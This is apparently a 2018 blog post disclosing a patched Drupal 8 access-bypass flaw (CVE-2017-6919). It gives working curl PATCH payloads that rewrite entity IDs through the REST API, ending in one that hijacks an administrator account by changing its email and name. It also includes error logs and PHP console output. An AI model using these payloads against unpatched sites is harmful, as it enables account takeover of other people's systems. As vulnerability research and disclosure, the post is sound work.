---
layout: post
title:  "Hijacking Drupal admin accounts using REST"
date:   2018-05-21 08:00:00 -0500
categories: drupal security
---
_Note: This exploit was fixed over a year ago as a part of
[SA-CORE-2017-002/CVE-2017-6919], so unless your Drupal 8 site is really,
really out of date, you should not be affected._

When I do security research on Drupal core, I tend to focus on one class of
vulnerability and pursue that until I find something.

You may have heard of [Drupalgeddon], the largest Drupal exploit to date, which
used SQL injection to modify data on vulnerable sites. SQL injection used to be
a lot easier to find, but Drupal core has traditionally been good about
sanitizing user input and forming dynamic queries in a way that’s safe. Even
knowing this, I wanted to find some way to exploit how Drupal executes SQL,
even if that wasn’t a traditional SQL injection attack.

I had been researching REST vulnerabilities at the time, and was poking at
nodes trying to perform malicious POST and PATCH requests to circumvent access
checking, validation, and serialization/normalization. After hours (alright,
more like days) of research, I had nothing. The REST resource for nodes was
solid and the Entity API blocked me every step of the way.

_Note: I researched this vulnerability on Drupal 8.3.1, so if you’re following
along please use that version._

Feeling disparaged, I decided to take a look at the JSON response for a node
again:

```json
{"nid":[{"value":1}],"uuid":[{"value":"c63a2388-8bf8-4f25-b563-8bd88bd1dea1"}],"vid":[{"value":1}],"langcode":[{"value":"en"}],"type":[{"target_id":"article","target_type":"node_type","target_uuid":"ee96e8f7-e0bb-411d-bde3-372e2669721d"}],"status":[{"value":true}],"title":[{"value":"My title"}],"uid":[{"target_id":1,"target_type":"user","target_uuid":"67a7e0a7-57f9-44d0-bbc9-7f43496487c4","url":"\/user\/1"}],"created":[{"value":1526675840}],"changed":[{"value":1526675848}],"promote":[{"value":true}],"sticky":[{"value":false}],"revision_timestamp":[{"value":1526675848}],"revision_uid":[{"target_id":1,"target_type":"user","target_uuid":"67a7e0a7-57f9-44d0-bbc9-7f43496487c4","url":"\/user\/1"}],"revision_log":[],"revision_translation_affected":[{"value":true}],"default_langcode":[{"value":true}],"path":[],"body":[{"value":"\u003Cp\u003EWow the body\u003C\/p\u003E\r\n","format":"basic_html","summary":""}],"comment":[{"status":2,"cid":0,"last_comment_timestamp":1526675848,"last_comment_name":null,"last_comment_uid":1,"comment_count":0}],"field_image":[],"field_tags":[]}
```

The top-level properties there are: nid, uuid, vid, langcode, type, status,
title, uid, created, changed, promote, sticky, revision_timestamp,
revision_uid, revision_log, revision_translation_affected, default_langcode,
path, body, comment, field_image, and field_tags.

When I was trying to exploit REST previously, I was sending bad data for fields
like body (XSS?), path (open redirect?), and field_image (access private
files?). None of this had worked, but I started to wonder about the base fields
in the response, specifically nid and uuid. What happens when you change the ID
or UUID of an entity?

Let’s try it out! We’re going to send a PATCH request for node 1, changing the
nid and title fields in hopes of modifying another entity's data:

```bash
$ curl -u admin:password -X PATCH http://localhost/node/1?_format=json -H 'Content-Type: application/json'
-d '{
      "nid":   [{"value": 2}],
      "type":  "article",
      "title": [{"value": "Hello world"}]
    }'
{"message":"Unprocessable entity: validation failed.\n: The content has either been modified by another user, or you have already submitted modifications. As a result, your changes cannot be saved.\n"}
```

That didn’t work, so next I tried to change the UUID and NID at the same time.
It would make sense that you need to pass a new UUID, as otherwise the UUID
from node 1 would be used, and wouldn't be very unique at all.

Let’s try changing both:

```bash
$ curl -u admin:password -X PATCH http://localhost/node/1?_format=json -H 'Content-Type: application/json'
-d '{
      "nid":   [{"value": 2}],
      "type":  "article",
      "uuid":  [{"value": "6786fd3c-cbc9-49a0-8b07-47ed78ed052e"}],
      "title": [{"value": "Hello world"}]
    }'
{}
```

This is interesting - an empty response was returned, and the response code was
500\.

This error was logged on the server:

```
Drupal\Core\Database\IntegrityConstraintViolationException: SQLSTATE[23000]:
Integrity constraint violation: 19 UNIQUE constraint failed: node.vid:
  UPDATE {node}
    SET nid=:db_update_placeholder_0, vid=:db_update_placeholder_1, type=:db_update_placeholder_2, uuid=:db_update_placeholder_3, langcode=:db_update_placeholder_4
    WHERE nid = :db_condition_placeholder_0; Array ( [:db_update_placeholder_0] => 2 [:db_update_placeholder_1] => 1 [:db_update_placeholder_2] => article [:db_update_placeholder_3] => 6786fd3c-cbc9-49a0-8b07-47ed78ed052e [:db_update_placeholder_4] => en [:db_condition_placeholder_0] => 2 ) in Drupal\Core\Database\Connection->handleQueryException() (line 682 of [redacted]/drupal/core/lib/Drupal/Core/Database/Connection.php).
```

So close! The query got all the way to the database before getting blocked. I
tried passing a random “vid” (revision ID) value, but after some researching
realized that this attack only worked if creating new revisions by default was
disabled for the target Content Type. After more testing I got the exploit
working, and could update any node regardless of my permission level!

The reason this was possible was that the Entity API never expected anyone to
ever update entity keys, so there was never access checking for them. I could
verify how this works in my PHP console:

```php
>>> $user = \Drupal\user\entity\User::getAnonymousUser();
=> Drupal\user\entity\User {#8632
>>> $node = \Drupal::entityTypeManager()->getStorage('node')->load(1);
=> Drupal\node\entity\Node {#9004
>>> // The “status” field can only be changed by users with the
>>> // “administer nodes” permission.
>>> // For details see \Drupal\node\NodeAccessControlHandler::checkFieldAccess
>>> \Drupal::entityTypeManager()
      ->getAccessControlHandler('node')
      ->fieldAccess('edit', $node->getFieldDefinition('status'), $user);
=> false
>>> // There is no explicit access checking for NID!
>>> \Drupal::entityTypeManager()
      ->getAccessControlHandler('node')
      ->fieldAccess('edit', $node->getFieldDefinition('nid'), $user);
=> true
```

To re-cap a bit, the stages of this exploit are:

1. Make an PATCH request to the REST resource for node 1, which our user has
valid access to.
1. Drupal sets the nid to another node's ID (2), and the uuid to a new value.
1. Drupal saves node 1, which generates an SQL query with a “WHERE nid = 2”
condition, allowing updates to node 2’s fields!

The SQL query was fully sanitized, but values and conditions are present that
Drupal did not expect. So strictly no SQL was injected into the query, but the
lack of access checking in the entity API led to an illogical query: “Update
node 1 where the ID is equal to 2”.

Updating arbitrary nodes is fun, but it was quickly clear that the big exploit
here would be to send a PATCH request for the current user, pass the ID of an
admin user, and gain access to their account.

The payload was similar - in this example user 2 changes the email and name of
user 1, which would then let me request a password reset and hijack the
administrative user. Note that the existing password of user 2 (“password”) is
provided as it's required to change the email and name fields:

```bash
$ curl -u admin:password -X PATCH http://localhost/user/2?_format=json -H 'Content-Type: application/json'
-d '{
      "uid":  [{"value": 1}],
      "uuid": [{"value": "2e9403a4-d8af-4096-a116-624710140be0"}],
      "name": [{"value": "yougothacked"}],
      "mail": [{"value": "yougot@hacked.com"}],
      "pass": [{"existing": "password"}]
    }'
```

It worked! Any user with access to update their profile with REST could change
the email and name of any other user on the site. Once an administrative
account has been hacked, attackers can, in the worst case, execute another
exploit to execute remote code on the server.

The Drupal security team treated this as a serious vulnerability and got a fix
out quickly. The code change can be [seen here] - in it the ID and UUID keys
can only be set when an entity is created, not when it’s updated. This was a
great example of a complex problem with a simple exploit and fix.

After the fix for this was released I started working with the security team as
a volunteer, and am now a full member. That means I have less time to research
new vulnerabilities, but am definitely not done hunting yet.

This issue left me wondering about other APIs out there - how many have not
handled the case of a property being changed that eventually results in a SQL
query that updates an unexpected row? Could you replicate this kind of attack
elsewhere, and is there a name for it yet? If I ever end up researching another
API this will definitely be on my list of things to check.

_Thanks to Jess (xjm), Michael Hess, and Moshe Weitzman for reviewing this
before I posted it._

[SA-CORE-2017-002/CVE-2017-6919]: https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-04-19/drupal-core-critical-access-bypass
[Drupalgeddon]: https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql
[seen here]: https://cgit.drupalcode.org/drupal/commit/?id=92e613a
